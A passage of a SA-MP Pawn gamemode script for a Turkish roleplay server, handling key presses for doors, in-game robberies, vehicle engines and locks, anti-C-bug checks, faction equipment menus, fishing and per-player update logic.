								Isyeri[i][ikasa] += Isyeri[i][girisucreti];
							}
		                    if(isnull(Isyeri[i][karsilama]))
		                    {
								return 1;
							}
							else
							{
			                    format(string, sizeof(string), "{E84D4D}[%s]{FFFFFF} %s", Isyeri[i][iad], Isyeri[i][karsilama]);
			                    SendClientMessage(playerid, COLOR_WHITE, string);
							}
						}
						else
						{
						    Hata(playerid, "Bu iþyerine girmek için yeterli paranýz yok.");
						}
					}
					else
					{
					    GameTextForPlayer(playerid, "~r~Kilitli", 5000, 1);
					}
				}
			}
			else if(PlayerToPoint(1.5, playerid, Isyeri[i][cikisX], Isyeri[i][cikisY], Isyeri[i][cikisZ]))
			{
			    if(GetPlayerVirtualWorld(playerid) == Isyeri[i][icikisvw])
			    {
			        if(GetPVarInt(playerid, "SoygunID") != -1)
					{
					    DeletePVar(playerid, "SoygunSure");
					    KillTimer(SoygunTextTimer[playerid]);
					    new _sid = GetPVarInt(playerid, "SoygunID");
					    if(Soygun[_sid][lider] == playerid)
					    {
					        IsyeriSoyuluyor[i] = false;
							SoygunTextGizle(Soygun[playerid][lider]);
							Soygun[playerid][lider] = -1;
							if(IsPlayerConnected(Soygun[playerid][oyuncu2])) {
								KillTimer(SoygunTextTimer[Soygun[playerid][oyuncu2]]);
								SoygunTextGizle(Soygun[playerid][oyuncu2]);
								Bilgi(Soygun[playerid][oyuncu2], "Soygun iptal edildi.");
							}
			                Soygun[playerid][oyuncu2] = -1;
							if(IsPlayerConnected(Soygun[playerid][oyuncu3])) {
								KillTimer(SoygunTextTimer[Soygun[playerid][oyuncu3]]);
								SoygunTextGizle(Soygun[playerid][oyuncu3]);
								Bilgi(Soygun[playerid][oyuncu3], "Soygun iptal edildi.");
							}
			                Soygun[playerid][oyuncu3] = -1;
							if(IsPlayerConnected(Soygun[playerid][oyuncu4])) {
								KillTimer(SoygunTextTimer[Soygun[playerid][oyuncu4]]);
								SoygunTextGizle(Soygun[playerid][oyuncu4]);
								Bilgi(Soygun[playerid][oyuncu4], "Soygun iptal edildi.");
							}
			                Soygun[playerid][oyuncu4] = -1;
							if(IsPlayerConnected(Soygun[playerid][oyuncu5])) {
								KillTimer(SoygunTextTimer[Soygun[playerid][oyuncu5]]);
								SoygunTextGizle(Soygun[playerid][oyuncu5]);
								Bilgi(Soygun[playerid][oyuncu5], "Soygun iptal edildi.");
							}
			                Soygun[playerid][oyuncu5] = -1;
							Soygun[playerid][isyerid] = -1;
							Soygun[playerid][isyeritip] = -1;
							foreach(new ixx : Player)
							{
							    if(Birlik[Karakter[ixx][birlik]][ftip] == LSPD)
							    {
							        RemovePlayerMapIcon(ixx, playerid);
							    }
							}
					    }
					    else if(Soygun[_sid][oyuncu2] == playerid)
					    {
					        Soygun[_sid][oyuncu2] = -1;
					    }
					    else if(Soygun[_sid][oyuncu3] == playerid)
					    {
					        Soygun[_sid][oyuncu3] = -1;
					    }
					    else if(Soygun[_sid][oyuncu4] == playerid)
					    {
					        Soygun[_sid][oyuncu4] = -1;
					    }
					    else if(Soygun[_sid][oyuncu5] == playerid)
					    {
					        Soygun[_sid][oyuncu5] = -1;
					    }
				    	SoygunTextGizle(playerid);
				    }
			        if(Isyeri[i][ikilit] == 0)
			        {
			            SetPlayerPos(playerid, Isyeri[i][girisX], Isyeri[i][girisY], Isyeri[i][girisZ]);
			            SetPlayerInteriorEx(playerid, Isyeri[i][igirisint]);
			            SetPlayerVirtualWorld(playerid, Isyeri[i][igirisvw]);
			            SetPlayerFacingAngle(playerid, Isyeri[i][girisangle]);
			            TogglePlayerControllable(playerid, 0);
			            SetTimerEx("CozEvladim", 3000, 0, "i", playerid);
	                    if(isnull(Isyeri[i][imuzik])) StopAudioStreamForPlayer(playerid);
					}
					else
					{
					    GameTextForPlayer(playerid, "~r~Kilitli", 5000, 1);
					}
				}
			}
		}
			//ev
 		foreach(new ev : Houses)
		{
	        if(PlayerToPoint(1.5, playerid, Ev[ev][girisX], Ev[ev][girisY], Ev[ev][girisZ]) && !IsPlayerInAnyVehicle(playerid))
	        {
	            if(GetPlayerVirtualWorld(playerid) == Ev[ev][egirisvw])
	            {
	                if(Ev[ev][ekilit] == 0)
	                {
	                    SetPlayerPos(playerid, Ev[ev][cikisX], Ev[ev][cikisY], Ev[ev][cikisZ]);
	                    SetPlayerInteriorEx(playerid, Ev[ev][ecikisint]);
	                    SetPlayerVirtualWorld(playerid, ev);
	                    SetPlayerFacingAngle(playerid, Ev[ev][ecikisangle]);
	                    TogglePlayerControllable(playerid, 0);
	                    SetTimerEx("CozEvladim", 3000, 0, "i", playerid);
					}
					else
					{
					    GameTextForPlayer(playerid, "~r~Kilitli", 5000, 1);
					}
				}
			}
			else if(PlayerToPoint(1.5, playerid, Ev[ev][cikisX], Ev[ev][cikisY], Ev[ev][cikisZ]))
			{
			    if(GetPlayerVirtualWorld(playerid) == ev)
			    {
			        if(Ev[ev][ekilit] == 0)
			        {
			            SetPlayerPos(playerid, Ev[ev][girisX], Ev[ev][girisY], Ev[ev][girisZ]);
			            SetPlayerInteriorEx(playerid, Ev[ev][egirisint]);
			            SetPlayerVirtualWorld(playerid, Ev[ev][egirisvw]);
			            SetPlayerFacingAngle(playerid, Ev[ev][egirisangle]);
			            TogglePlayerControllable(playerid, 0);
			            SetTimerEx("CozEvladim", 3000, 0, "i", playerid);
					}
					else
					{
					    GameTextForPlayer(playerid, "~r~Kilitli", 5000, 1);
					}
				}
			}
		}
	    if(GetPlayerState(playerid) == PLAYER_STATE_DRIVER)
	    {
	        new string[128];
	        new allahini = GetPlayerVehicleID(playerid);
	        if(!IsEngineVehicle(allahini)) return Hata(playerid, "Bu aracýn motorunu açamazsýnýz.");
	        if(GetMotor(allahini) == 1 && !MotoruAciliyor[allahini]) // 1 açýk
	        {
				MotoruKapat(allahini);
				format(string,sizeof(string),"* aracýn motorunu durdurur.");
				SetPlayerChatBubble(playerid,string,COLOR_CPURPLE2,8.0,10000);
				format(string,sizeof(string),"(( %s aracýn motorunu durdurur. ))",OyuncuAdiniBul(playerid));
				SendClientMessage(playerid,0xC2A2DAFF,string);
				format(string, sizeof(string), "anahtarý çevirerek %s model aracýn motorunu durdurur.", VehicleName[GetVehicleModel(allahini)-400][0]);
				MeGonderArac(playerid, 30.0, string);
	            return 1;
			}
			if(Karakter[playerid][meslek] == 6 && otobuste[playerid] == 0 && GetVehicleModel(GetPlayerVehicleID(playerid)) == 437)
			{
				Bilgi(playerid, "Otobüs seferine baþladýnýz, checkpointleri takip ediniz.");
				otobuste[playerid] = 1;
				Karakter[playerid][pCheckpoint] = 10;
	        	SetPlayerCheckpoint(playerid, 1172.6190,-1834.1420,13.4051, 5.0);
	        	MotoruAciliyor[GetPlayerVehicleID(playerid)] = true;
				MotoruAc(GetPlayerVehicleID(playerid), playerid);
				return 1;
			}
			if(SevkiyatGorev[playerid] == 1 && Arac[allahini][atip] == 10)
			{
			    if(cezali[allahini] > 2500) return Hata(playerid, "Bu aracýn cezasý bulunmamaktadýr, cezayý ödemeden aracý kullanamazsýnýz.");
			    if(Arac[allahini][parcalandi]) return Hata(playerid, "Araç parçalandýðý için motorunu çalýþtýramazsýnýz.");
			    MotoruAciliyor[allahini] = true;
				format(string,sizeof(string),"* aracýn motorunu çalýþtýrýr.");
				SetPlayerChatBubble(playerid,string,COLOR_CPURPLE2,8.0,10000);
				format(string,sizeof(string),"(( %s aracýn motorunu çalýþtýrýr. ))",OyuncuAdiniBul(playerid));
				SendClientMessage(playerid,0xC2A2DAFF,string);
				format(string, sizeof(string), "anahtarý çevirerek %s model aracýn motorunu çalýþtýrýr.", VehicleName[GetVehicleModel(allahini)-400][0]);
				MeGonderArac(playerid, 30.0, string);
				SetTimerEx("MotoruAc", 3000, false, "ii", allahini, playerid);
				return 1;
			}
			if(SicilTGorevde[playerid] == 1 && allahini == GetPVarInt(playerid, "SicilArac"))
			{
			    if(cezali[allahini] > 2500) return Hata(playerid, "Bu aracýn cezasý bulunmamaktadýr, cezayý ödemeden aracý kullanamazsýnýz.");
			    if(Arac[allahini][parcalandi]) return Hata(playerid, "Araç parçalandýðý için motorunu çalýþtýramazsýnýz.");
			    MotoruAciliyor[allahini] = true;
				format(string,sizeof(string),"* aracýn motorunu çalýþtýrýr.");
				SetPlayerChatBubble(playerid,string,COLOR_CPURPLE2,8.0,10000);
				format(string,sizeof(string),"(( %s aracýn motorunu çalýþtýrýr. ))",OyuncuAdiniBul(playerid));
				SendClientMessage(playerid,0xC2A2DAFF,string);
				format(string, sizeof(string), "anahtarý çevirerek %s model aracýn motorunu çalýþtýrýr.", VehicleName[GetVehicleModel(allahini)-400][0]);
				MeGonderArac(playerid, 30.0, string);
				SetTimerEx("MotoruAc", 3000, false, "ii", allahini, playerid);
				return 1;
			}
			if(KamGorevde[playerid] == 1 && Arac[allahini][atip] == 11)
			{
			    if(cezali[allahini] > 2500) return Hata(playerid, "Bu aracýn cezasý bulunmamaktadýr, cezayý ödemeden aracý kullanamazsýnýz.");
			    if(Arac[allahini][parcalandi]) return Hata(playerid, "Araç parçalandýðý için motorunu çalýþtýramazsýnýz.");
			    MotoruAciliyor[allahini] = true;
				format(string,sizeof(string),"* aracýn motorunu çalýþtýrýr.");
				SetPlayerChatBubble(playerid,string,COLOR_CPURPLE2,8.0,10000);
				format(string,sizeof(string),"(( %s aracýn motorunu çalýþtýrýr. ))",OyuncuAdiniBul(playerid));
				SendClientMessage(playerid,0xC2A2DAFF,string);
				format(string, sizeof(string), "anahtarý çevirerek %s model aracýn motorunu çalýþtýrýr.", VehicleName[GetVehicleModel(allahini)-400][0]);
				MeGonderArac(playerid, 30.0, string);
				SetTimerEx("MotoruAc", 3000, false, "ii", allahini, playerid);
				return 1;
			}
			if(LojGorevde[playerid] == 1 && Arac[allahini][atip] == 13)
			{
			    if(cezali[allahini] > 2500) return Hata(playerid, "Bu aracýn cezasý bulunmamaktadýr, cezayý ödemeden aracý kullanamazsýnýz.");
			    if(Arac[allahini][parcalandi]) return Hata(playerid, "Araç parçalandýðý için motorunu çalýþtýramazsýnýz.");
			    MotoruAciliyor[allahini] = true;
				format(string,sizeof(string),"* aracýn motorunu çalýþtýrýr.");
				SetPlayerChatBubble(playerid,string,COLOR_CPURPLE2,8.0,10000);
				format(string,sizeof(string),"(( %s aracýn motorunu çalýþtýrýr. ))",OyuncuAdiniBul(playerid));
				SendClientMessage(playerid,0xC2A2DAFF,string);
				format(string, sizeof(string), "anahtarý çevirerek %s model aracýn motorunu çalýþtýrýr.", VehicleName[GetVehicleModel(allahini)-400][0]);
				MeGonderArac(playerid, 30.0, string);
				SetTimerEx("MotoruAc", 3000, false, "ii", allahini, playerid);
				return 1;
			}
       	    if(Arac[allahini][aowner] == Karakter[playerid][sqlid] || (Karakter[playerid][meslek] == 2 && Taksi[playerid] == allahini) || (Karakter[playerid][birlik] == Arac[allahini][abirlik]) || AracAnahtarKontrol(playerid, allahini) || IsyeriYetkilisi(playerid, Arac[allahini][aisyeri]))
			{
				if(GetMotor(allahini) == 0 && !MotoruAciliyor[allahini])
				{
					if(IsAirVehicle(allahini) && !Karakter[playerid][havalisans]) return Mesaj(playerid, HATA_MESAJ, "Bu aracý kullanabilmeniz için hava lisansýna ihtiyacýnýz var.");
				    if(Modifiyede[playerid] && GetPlayerVehicleSeat(playerid) != 0) return 1;
				    if(cezali[allahini] > 2500) return Hata(playerid, "Bu aracýn cezasý bulunmamaktadýr, cezayý ödemeden aracý kullanamazsýnýz.");
				    if(Arac[allahini][parcalandi]) return Hata(playerid, "Araç parçalandýðý için motorunu çalýþtýramazsýnýz.");
					MotoruAciliyor[allahini] = true;
					format(string,sizeof(string),"* aracýn motorunu çalýþtýrýr.");
					SetPlayerChatBubble(playerid,string,COLOR_CPURPLE2,8.0,10000);
					format(string,sizeof(string),"(( %s aracýn motorunu çalýþtýrýr. ))",OyuncuAdiniBul(playerid));
					SendClientMessage(playerid,0xC2A2DAFF,string);
					format(string, sizeof(string), "anahtarý çevirerek %s model aracýn motorunu çalýþtýrýr.", VehicleName[GetVehicleModel(allahini)-400][0]);
					MeGonderArac(playerid, 30.0, string);
					SetTimerEx("MotoruAc", 3000, false, "ii", allahini, playerid);
				}
			}
		}
	}
	if(PRESSED(KEY_NO))
	{
	    if(GetPlayerVirtualWorld(playerid) <= 20 && GetPlayerInterior(playerid) == 1) {
		    for(new i=0;i<sizeof(OtelKapiPos);i++) {
				if(IsPlayerInRangeOfPoint(playerid, 1.0, OtelKapiPos[i][0], OtelKapiPos[i][1], OtelKapiPos[i][2])) {
				    new otelid = (12*GetPlayerVirtualWorld(playerid))-(12-i+1)+1;
					if(Otel[otelid][osahip] == Karakter[playerid][sqlid]) {
						if(Otel[otelid][kilitli]) {
	                        Otel[otelid][kilitli] = false;
	                        Bilgi(playerid, "Odanýn kilidini açtýnýz.");
	                        OnPlayerCommandPerformed(playerid,"/me anahtarlarýný çýkarýr ve odanýn kilidini açar.",0);
						}
						else {
							Otel[otelid][kilitli] = true;
							Bilgi(playerid, "Odayý kilitlediniz.");
							OnPlayerCommandPerformed(playerid,"/me anahtarlarýný çýkarýr ve odayý kilitler.",0);
						}
					}
				}
			}
		}
		if(GetPlayerInterior(playerid) == 1 || GetPlayerInterior(playerid) == 2) {
		    if(GetPlayerVirtualWorld(playerid) <= 240) {
                for(new i=0;i<sizeof(OtelOdaPos);i++) {
					if(IsPlayerInRangeOfPoint(playerid, 1.0, OtelOdaPos[i][0], OtelOdaPos[i][1], OtelOdaPos[i][2])) {
					    new otelid = GetPlayerVirtualWorld(playerid);
					    if(Otel[otelid][osahip] == Karakter[playerid][sqlid]) {
							if(Otel[otelid][kilitli]) {
		                        Otel[otelid][kilitli] = false;
		                        Bilgi(playerid, "Odanýn kilidini açtýnýz.");
		                        OnPlayerCommandPerformed(playerid,"/me anahtarlarýný çýkarýr ve odanýn kilidini açar.",0);
							}
							else {
								Otel[otelid][kilitli] = true;
								Bilgi(playerid, "Odayý kilitlediniz.");
								OnPlayerCommandPerformed(playerid,"/me anahtarlarýný çýkarýr ve odayý kilitler.",0);
							}
						}
					}
				}
			}
		}
	    new vid = GetNearestVehicle(playerid);
      	if(vid != INVALID_VEHICLE_ID)
       	{
       	    if(!IsDoorVehicle(vid)) return Hata(playerid, "Bu aracý kilitleyemezsiniz.");
       	    if(Arac[vid][aowner] == Karakter[playerid][sqlid] || (Karakter[playerid][meslek] == 2 && Taksi[playerid] == vid) || (Karakter[playerid][birlik] == Arac[vid][abirlik]) || AracAnahtarKontrol(playerid, vid) || IsyeriYetkilisi(playerid, Arac[vid][aisyeri]))
       	    {
       	        new string[64];
				if(Arac[vid][akilit])
				{
					format(string, sizeof(string), "~g~KILIT ACILDI");
	    			GameTextForPlayer(playerid, string, 2000, 4);
					KilitAc(vid);
					format(string,sizeof(string),"* aracýn kilidini açar.");
					SetPlayerChatBubble(playerid,string,COLOR_CPURPLE2,8.0,10000);
					format(string,sizeof(string),"(( %s aracýn kilidini açar. ))",OyuncuAdiniBul(playerid));
					SendClientMessage(playerid,0xC2A2DAFF,string);
				}
				else
				{
					format(string, sizeof(string), "~r~KILITLENDI");
					GameTextForPlayer(playerid, string, 2000, 4);
	    			KilitKapat(vid);
	    			format(string,sizeof(string),"* aracý kilitler.");
					SetPlayerChatBubble(playerid,string,COLOR_CPURPLE2,8.0,10000);
					format(string,sizeof(string),"(( %s aracý kilitler. ))",OyuncuAdiniBul(playerid));
					SendClientMessage(playerid,0xC2A2DAFF,string);
				}
				return 1;
			}
			else return Hata(playerid, "Bu aracýn anahtarýna sahip deðilsiniz.");
        }
	}
	if(newkeys & KEY_AIM && !IsPlayerInAnyVehicle(playerid))
 	{
        if(flashlight[playerid]==1)
 		{
            RemovePlayerAttachedObject(playerid,9);
            RemovePlayerAttachedObject(playerid,8);
            SetPlayerAttachedObject(playerid, 9,18656, 6, 0.25, -0.0155, 0.16, 86.5, -185, 86.5, 0.03, 0.03, 0.03);
            SetPlayerAttachedObject(playerid, 8,18641, 6, 0.2, 0.01, 0.16, 90, -95, 90, 1, 1, 1);
            flashlight[playerid]=1;
        	return 1;
        }
        else if(flashlight[playerid]==2)
 		{
            RemovePlayerAttachedObject(playerid,9);
            RemovePlayerAttachedObject(playerid,8);
            SetPlayerAttachedObject(playerid, 9,18656, 6, 0.16, -0.0155, 0.16, 86.5, -185, 86.5, 0.03, 0.1, 0.03);
            SetPlayerAttachedObject(playerid, 8,18641, 6, 0.2, 0.01, 0.16, 90, -95, 90, 1, 1, 1);
            flashlight[playerid]=2;
        	return 1;
    	}
 	}
	if(PRESSED(KEY_LOOK_BEHIND))
	{
	    if(GetPlayerState(playerid) == PLAYER_STATE_DRIVER)
	    {
     	    new vid = GetPlayerVehicleID(playerid);
	        if(Arac[vid][aowner] == Karakter[playerid][sqlid] || (Karakter[playerid][birlik] == Arac[vid][abirlik]) || AracAnahtarKontrol(playerid, vid) || IsyeriYetkilisi(playerid, Arac[vid][aisyeri]))
	        {
				new engine,lights,alarm,doors,bonnet,boot,objective;
				GetVehicleParamsEx(vid,engine,lights,alarm,doors,bonnet,boot,objective);
				if(lights) SetVehicleParamsEx(vid,engine,0,alarm,doors,bonnet,boot,objective);
				else SetVehicleParamsEx(vid,engine,1,alarm,doors,bonnet,boot,objective);
			}
		}
	}
	if(!pCBugging[playerid] && GetPlayerState(playerid) == PLAYER_STATE_ONFOOT)
	{
		if(PRESSED(KEY_FIRE))
		{
			switch(GetPlayerWeapon(playerid))
			{
				case WEAPON_DEAGLE, WEAPON_SHOTGUN, WEAPON_SNIPER:
				{
					ptsLastFiredWeapon[playerid] = gettime();
				}
			}
		}
		else if(PRESSED(KEY_CROUCH))
		{
			if((gettime() - ptsLastFiredWeapon[playerid]) < 1)
			{
				TogglePlayerControllable(playerid, false);

				pCBugging[playerid] = true;

				KillTimer(ptmCBugFreezeOver[playerid]);
				ptmCBugFreezeOver[playerid] = SetTimerEx("CBugFreezeOver", 1500, false, "i", playerid);
			}
		}
	}
    if(!pTwoShotting[playerid])
	{
		if(PRESSED(KEY_FIRE))
		{
			switch(GetPlayerWeapon(playerid))
			{
				case WEAPON_SAWEDOFF:
				{
					new ammo = GetPlayerAmmo(playerid);
					if(((gettime() - ptsAttemptingToBypassSystem[playerid]) < 2) || (pAttemptingTwoShot[playerid] && (pLastBulletAmount[playerid] - ammo) == 2))
					{
						TogglePlayerControllable(playerid, false);

						pTwoShotting[playerid] = true;

						KillTimer(ptmTwoShotFreezeOver[playerid]);
						ptmTwoShotFreezeOver[playerid] = SetTimerEx("TwoShotFreezeOver", 1500, false, "i", playerid);
					}

					pLastBulletAmount[playerid] = ammo;
					pFiredSawnoff[playerid] = true;
					pAttemptingTwoShot[playerid] = false;
				}
				default:
				{
					pAttemptingTwoShot[playerid] = false;
					ptsAttemptingToBypassSystem[playerid] = gettime();
				}
			}
		}
	}
	if((newkeys & KEY_FIRE) || (newkeys & KEY_FIRE) && (oldkeys & KEY_FIRE) || (newkeys & KEY_FIRE) && (oldkeys & KEY_HANDBRAKE) || (oldkeys & KEY_FIRE) && (newkeys & KEY_HANDBRAKE))
	{
		if(Karakter[playerid][gYapiyor] == 1)
		{
		    GraffitiKontrol(playerid);
		}
	}
    if(GetPlayerWeapon(playerid) == 4)
 	{
		if(newkeys & KEY_AIM)
		{
  			RemovePlayerWeapon(playerid, 4);
  			Bilgi(playerid, "Sistemsel öldürmeye çalýþtýðýnýz için býçaðýnýz silindi.");
		}
	}
	if((newkeys==KEY_ACTION)&&(IsPlayerInAnyVehicle(playerid))&&(GetPlayerState(playerid)==PLAYER_STATE_DRIVER))
	{
		if(GetVehicleModel(GetPlayerVehicleID(playerid))==525 && Arac[GetPlayerVehicleID(playerid)][abirliktip] == LSPD || GetVehicleModel(GetPlayerVehicleID(playerid))==525 && Arac[GetPlayerVehicleID(playerid)][abirliktip] == MODIFIYE)
		{
			new Float:pX,Float:pY,Float:pZ;
			GetPlayerPos(playerid,pX,pY,pZ);
			new Float:vX,Float:vY,Float:vZ;
			new Found=0;
			new vid=1;
			while((vid<MAX_VEHICLES)&&(!Found))
			{
				vid++;
				GetVehiclePos(vid,vX,vY,vZ);
				if((floatabs(pX-vX)<7.0)&&(floatabs(pY-vY)<7.0)&&(floatabs(pZ-vZ)<7.0)&&(vid!=GetPlayerVehicleID(playerid)))
				{
					Found=1;
					if(IsTrailerAttachedToVehicle(GetPlayerVehicleID(playerid)))
					{
						DetachTrailerFromVehicle(GetPlayerVehicleID(playerid));
					}
					else
					{
						AttachTrailerToVehicle(vid,GetPlayerVehicleID(playerid));
					}
				}
			}
		}
	}
	if(newkeys & KEY_YES)
	{
	    if(Birlik[Karakter[playerid][birlik]][ftip] == FBI)
	    {
	    	if(IsPlayerInRangeOfPoint(playerid, 5.0, 1159.1600,375.7347,1002.1450) && GetPlayerVirtualWorld(playerid) == 434 && GetPlayerInterior(playerid) == 1)
	    	{
	        	ShowPlayerDialog(playerid, 156, DIALOG_STYLE_LIST, ""C7"EIGHTBORN - "C8"Ekipman Odasý", " Cop\n Biber Gazý\n Desert Eagle\n MP5\n M4\n Shotgun\n Glock\n Ýç Yelek\n Operasyon Yeleði\n Kask\n Can\n Ekipman Býrak\n Skin", "Onayla", "Kapat");
			}
		}
	    if(Birlik[Karakter[playerid][birlik]][ftip] == LSPD && Karakter[playerid][isbasi])
	    {
	    	if(IsPlayerInRangeOfPoint(playerid, 5.0, Veriler[ekipmanX], Veriler[ekipmanY], Veriler[ekipmanZ]))
	    	{
	    	    if(!Karakter[playerid][isbasi]) return Hata(playerid, "Ýþbaþý olmamýþsýnýz.");
	        	ShowPlayerDialog(playerid, 156, DIALOG_STYLE_LIST, ""C7"EIGHTBORN - "C8"Ekipman Odasý", " Cop\n Biber Gazý\n Desert Eagle\n MP5\n M4\n Shotgun\n Glock\n Ýç Yelek\n Operasyon Yeleði\n Kask\n Can\n Ekipman Býrak", "Onayla", "Kapat");
			}
		}
		if(Birlik[Karakter[playerid][birlik]][ftip] == LSPA)
	    {
	    	if(IsPlayerInRangeOfPoint(playerid, 5.0, 1355.8397,36.8486,1010.5634))
	    	{
	    	    if(!Karakter[playerid][isbasi]) return Hata(playerid, "Ýþbaþý olmamýþsýnýz.");
	        	ShowPlayerDialog(playerid, 156, DIALOG_STYLE_LIST, ""C7"EIGHTBORN - "C8"Ekipman Odasý", " Cop\n Biber Gazý\n Desert Eagle\n MP5\n M4\n Shotgun\n Glock\n Ýç Yelek\n Operasyon Yeleði\n Kask\n Can\n Ekipman Býrak", "Onayla", "Kapat");
			}
		}
		if(IsFishingPos(playerid))
	    {
	        if(Karakter[playerid][olta] == 1)
			{
		        new vehicleid = GetPlayerVehicleID(playerid);
	     		if(!IsPlayerInVehicle(playerid, vehicleid))
	     		{
					if(YemOltada[playerid])
					{
						if(!BalikTutuyor[playerid])
						{
							balikvuruyortimer[playerid] = SetTimerEx("BalikVuruyor", randomEx(15000,19999), 0, "i", playerid);
				            TogglePlayerControllable(playerid, 0);
				            BalikTutuyor[playerid] = 1;
				            YemOltada[playerid] = 0;
						    ApplyAnimationEx(playerid,"SWORD","sword_block",50.0,0, 1,0,1,1);
						    SetPlayerAttachedObject(playerid,9,18632,5,0.116999,0.023000,-0.105999,0.000000,0.000000,0.000000,1.000000,1.000000,1.000000);
      					}
					}
					else
					{
						if(!BalikTutuyor[playerid])
						{
						    if(Karakter[playerid][balik] >= 20) return Hata(playerid, "Üzerinizde en fazla 20 balýk bulundurabilirsiniz.");
						    if(Karakter[playerid][yemmiktar][Karakter[playerid][yem]] > 0)
						    {
						        Bilgi(playerid, "Yeminizi oltanýza taktýnýz.");
								YemOltada[playerid] = 1;
								Karakter[playerid][yemmiktar][Karakter[playerid][yem]]--;
							}
							else
							{
								Hata(playerid, "Yeminiz yok.");
							}
						}
					}
				}
				else
				{
					Hata(playerid, "Araçtayken balýk tutamazsýnýz.");
				}
			}
		}
	}
	if(newkeys & KEY_SPRINT)
	{
	    if(IsFishingPos(playerid))
	    {
	    	if(BalikVuruyorVar[playerid])
			{
				SetTimerEx("BalikCek", random(1000)+1000, 0, "i", playerid);
				BalikCekiyor[playerid] = 1;
				BalikTutuyor[playerid] = 0;
				BalikVuruyorVar[playerid] = 0;
			}
			else
			{
			    if(BalikTutuyor[playerid])
			    {
			  		KillTimerEx(balikvuruyortimer[playerid]);
					Bilgi(playerid, "Yeminizi geri kazandýnýz.");
					Karakter[playerid][yemmiktar][Karakter[playerid][yem]]++;
					TogglePlayerControllable(playerid, 1);
					BalikTutuyor[playerid] = 0;
					BalikVuruyorVar[playerid] = 0;
				    ApplyAnimationEx(playerid, "CARRY", "crry_prtial", 4.0, 0, 0, 0, 0, 0);
				    RemovePlayerAttachedObject(playerid, 9);
				}
			}
		}
	}
	return 1;
}

public OnRconLoginAttempt(ip[], password[], success)
{
	if(Debug) printf("OnRconLoginAttempt(%s, %s, %d)",ip, password, success);
	return 1;
}

forward PwepSifirla(playerid);
public PwepSifirla(playerid)
{
	Pwep[playerid] = 0;
	SetPVarInt(playerid, "PwepTimer", 0);
	return 1;
}

public OnPlayerUpdate(playerid)
{
	if(IsPlayerNPC(playerid)) return 1;
	/*if(GetPVarInt(playerid, "CCTV_Izliyor")) {
		new Keys, ud, lr, Float:cPos[3];
    	GetPlayerKeys(playerid, Keys, ud, lr);
		GetPlayerCameraFrontVector(playerid, cPos[0], cPos[1], cPos[2]);
		if(ud == KEY_UP) SetPVarFloat(playerid, "CCTVCameraY", GetPVarFloat(playerid, "CCTVCameraY")+5);
    	else if(ud == KEY_DOWN) SetPVarFloat(playerid, "CCTVCameraY", GetPVarFloat(playerid, "CCTVCameraY")-5);
		if(lr == KEY_LEFT) SetPVarFloat(playerid, "CCTVCameraX", GetPVarFloat(playerid, "CCTVCameraX")+5);
    	else if(lr == KEY_RIGHT) SetPVarFloat(playerid, "CCTVCameraX", GetPVarFloat(playerid, "CCTVCameraX")-5);
		SetPlayerCameraLookAt(playerid, GetPVarFloat(playerid, "CCTVCameraX"), GetPVarFloat(playerid, "CCTVCameraY"), GetPVarFloat(playerid, "CCTVCameraZ"));
	}*/
 	if(Karakter[playerid][suruklenen] != -1)
	{
		if(IsPlayerConnected(Karakter[playerid][suruklenen]))
		{
			SetPlayerVirtualWorld(playerid, GetPlayerVirtualWorld(Karakter[playerid][suruklenen]));
			SetPlayerInteriorEx(playerid, GetPlayerInterior(Karakter[playerid][suruklenen]));
		    GetPlayerPos(Karakter[playerid][suruklenen], Karakter[playerid][posx], Karakter[playerid][posy], Karakter[playerid][posz]);
    		SetPlayerPos(playerid, Karakter[playerid][posx], Karakter[playerid][posy], Karakter[playerid][posz]);
	    }
	    else
	    {
	        Karakter[playerid][suruklenen] = -1;
	        Bilgi(playerid, "Sürüklediðiniz oyuncu oyundan düþtü/çýktý.");
	    }
	}
	if(GetPlayerInterior(playerid) > 0) // && GetPlayerInterior(playerid) != 10
	{
	SetPlayerTime(playerid, 12, 0);
	SetPlayerWeather(playerid, 1);
	}
	else if(GetPlayerInterior(playerid) == 10)
	{
	SetPlayerTime(playerid, 24, 0);
	SetPlayerWeather(playerid, 1);
	}
	if(GetPlayerInterior(playerid) == 0)
	{
	new hour,minute,second;
	gettime(hour,minute,second);
	if(hour >= 18 && hour <= 24) {
		switch(hour) {
			case 18: SetPlayerTime(playerid, 22, 0);
			case 19: SetPlayerTime(playerid, 23, 0);
			case 20: SetPlayerTime(playerid, 24, 0);
			case 21..24: SetPlayerTime(playerid, 1, 0);
		}
	}
	else SetPlayerTime(playerid, hour, 0);
	}
 	for(new wp=0;wp<47;wp++)
	{
		if(!IsValidWeaponID(wp)) continue;
		if(!MermisizSilah(wp)) continue;
  		if(Karakter[playerid][MermiM][wp] == 0) Karakter[playerid][MermiM][wp] = 1;
	}
	if (ehliyettesti[playerid] == 1 && IsPlayerInVehicle(playerid, ehliyetaraci[playerid]))
 	{
		if (GetPlayerSpeedTest(playerid) >= 100.0)
		{
			if (++ehliyetuyari[playerid] < 3)
			{
	   			SendClientMessageEx(playerid, COLOR_LIGHTRED, "[UYARI]{FFFFFF} Çok hýzlý gidiyorsun, yavaþla! (%d/3)", ehliyetuyari[playerid]);
	   		}
	   		else
			{
	   			CancelDrivingTest(playerid);
	   			SendClientMessage(playerid, COLOR_LIGHTRED, "[UYARI]{FFFFFF} Hýzlý gittiðin için testten geçemedin!");
			}
		}
	}
	if(GetPlayerState(playerid) == PLAYER_STATE_ONFOOT)
	{
		if(IsPlayerBleeding(playerid)) UpdatePlayerBleeds(playerid);
	}
	if(Girdi[playerid])
	{
		if(Birlik[Karakter[playerid][birlik]][ftip] == LSPD && Karakter[playerid][isbasi] == 1 && !gDedektif[playerid]) SetPlayerColor(playerid, 0x8D8DFFFF);
		else if(Birlik[Karakter[playerid][birlik]][ftip] == LSPA && Karakter[playerid][isbasi] == 1) SetPlayerColor(playerid, 0x8D8DFFFF);
		else if(Birlik[Karakter[playerid][birlik]][ftip] == FBI && Karakter[playerid][isbasi] == 1) SetPlayerColor(playerid, 0x8D8DFFFF);
		else if(Birlik[Karakter[playerid][birlik]][ftip] == ASMS && Karakter[playerid][medisbasi] == 1) SetPlayerColor(playerid, COLOR_LSMC);
		else if(Birlik[Karakter[playerid][birlik]][ftip] == LSFD && Karakter[playerid][fdisbasi] == 1) SetPlayerColor(playerid, COLOR_LSFD);
		else if(Birlik[Karakter[playerid][birlik]][ftip] == SANTV && Karakter[playerid][sisbasi] == 1) SetPlayerColor(playerid, COLOR_SANTV);
		else if(SicilTGorevde[playerid] == 1&& Karakter[playerid][misbasi] == 1) SetPlayerColor(playerid, COLOR_RED);
		else if(Karakter[playerid][mekisbasi] == 1) SetPlayerColor(playerid, 0x8B5D2EFF);
